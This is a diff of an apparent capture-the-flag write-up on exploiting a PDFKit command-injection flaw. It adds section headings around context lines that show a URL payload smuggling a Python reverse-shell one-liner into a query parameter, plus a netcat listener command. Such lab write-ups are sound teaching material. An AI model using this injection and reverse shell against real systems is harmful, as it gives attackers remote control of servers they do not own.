@@ -91,6 +91,8 @@ https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795
 
 We can test the exploit from the website.
 
+### Gaining Access / Exploitation
+
 <img src="https://user-images.githubusercontent.com/67650329/206104612-fe9d9fe2-835e-4656-84f7-78af05d70ca8.png" width="500px" align="center">
 <img src="https://user-images.githubusercontent.com/67650329/206104790-fa35550e-e6e4-4d87-a3cd-a24b755950ce.png" width="500px" align="center">
 
@@ -109,6 +111,8 @@ http://[Machine_IP]/?name=%20`python3 -c 'import socket,subprocess,os;s=socket.s
 ```
 
 Before run the exploit, Don't forget to run the listener.
+
+### Maintaining Access / Post Exploitation
 
 `nc -lvnp 4444`
 
